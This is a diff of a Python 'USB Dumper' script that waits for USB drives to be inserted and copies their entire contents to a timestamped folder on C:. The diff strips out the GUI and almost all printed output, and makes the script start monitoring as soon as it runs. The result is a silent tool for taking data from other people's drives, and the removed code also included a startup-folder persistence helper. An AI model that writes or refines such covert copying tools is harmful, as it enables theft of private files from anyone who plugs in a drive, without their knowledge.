@@ -1,82 +1,57 @@
-import tkinter
 import os
-from tkinter import filedialog as fd
 import time
 import datetime
-import shutil
-import winshell
+
 copytime = str(round(time.time()))
 cdate = str(datetime.datetime.now().date())
-USB = 'F:' #defines usb stick primarily
+
+USB = 'D:'
 SAVE = f'C:/USB/usb_{cdate}_{copytime}'
 OLD=[]
 dict={'D':0,'E':0,'F':0,'G':0,'H':0,'I':0,'J':0,'K':0,'L':0}
 
-def usbcopy(): #main copy function
-    
-    shutil.copytree(USB, SAVE)
-    print('Done')
+def usbcopy():
+    import shutil
+    try:
+        shutil.copytree(USB, SAVE)
+    except Exception as e:
+        print(f'Not copied {e}')
+    #print('Done')
 
 def getUsb(): #if copied files exists, stop the fn
     global OLD
     NEW=os.listdir(USB)
     if (len(NEW) == len(OLD)):
-        print("The contents of the USB flash drive have not changed")
+        #print("The contents of the USB flash drive have not changed")
         return 0
     else:
         OLD = NEW
         return 1
 
-def usbcheck(): #usb {dict} check, detect and run usbcopy()
+def usbcheck():
     global USB
-    for i in range(9): #check if exists pendrive
+    for i in range(9):
         name = chr(i + ord('D')) + ':'
-        print (name)
+        #print (name)
         if os.path.exists(name):
             dict[chr(i + ord('D'))] = 1
-            print('disk exists' + chr(i + ord('D')))
+            #print('disk exists' + chr(i + ord('F')))
 
-    while (1): #after pendrive detection, run getusb() then usbcopy()
+    while (1):
         for i in range(9):
             name = chr(i + ord('D')) + ':'
             if not os.path.exists(name):
                 dict[chr(i + ord('D'))] = 0
             if os.path.exists(name) and dict[chr(i+ord('D'))]==0:
                 USB = name
-                print("USB stick detected")
+                #print("USB stick detected")
                 if getUsb():
                     try:
                         usbcopy()
                     except Exception as e:
                         print(Exception, e)
-        print("No USB flash drive for the time being, start sleeping")
+        #print("No USB flash drive for the time being, start sleeping")
         time.sleep(1)# sleep time
-        print("End of hibernation")
+        #print("End of hibernation")
 
-def choseDir():
-    global SAVE
-    SAVE=fd.askdirectory(parent=root,initialdir="/",title='Pick a directory')+'/usbCopy'
-    print('SAVE IN ' + SAVE)
-
-
-def clickButton():
-    root.withdraw()
-    usbcheck()
-
-def copyStart(): #copy to start
-    file =r'\pendriveSA.exe'
-    a = winshell.startup()
-    destination = a+file
-    source =str(os.getcwd()) +file
-    shutil.copyfile(source, destination)
-    print('Copied to Start')
-
-if __name__ == '__main__':
-    root=tkinter.Tk()
-    root.title('USB Dumper')
-    root.geometry('700x400')
-    tkinter.Label(root,text=f' Modified by Sabbir: Original: \ngithub.com/Ginray/USB-Dumper/issues\n\n').pack()
-    tkinter.Button(root,text='Copy to start menu',command=copyStart).pack()
-    tkinter.Button(root,text='Change Save Directory',command=choseDir).pack()
-    tkinter.Button(root,text='Start USB Dumper',command=clickButton).pack()
-    root.mainloop()
+usbcheck()
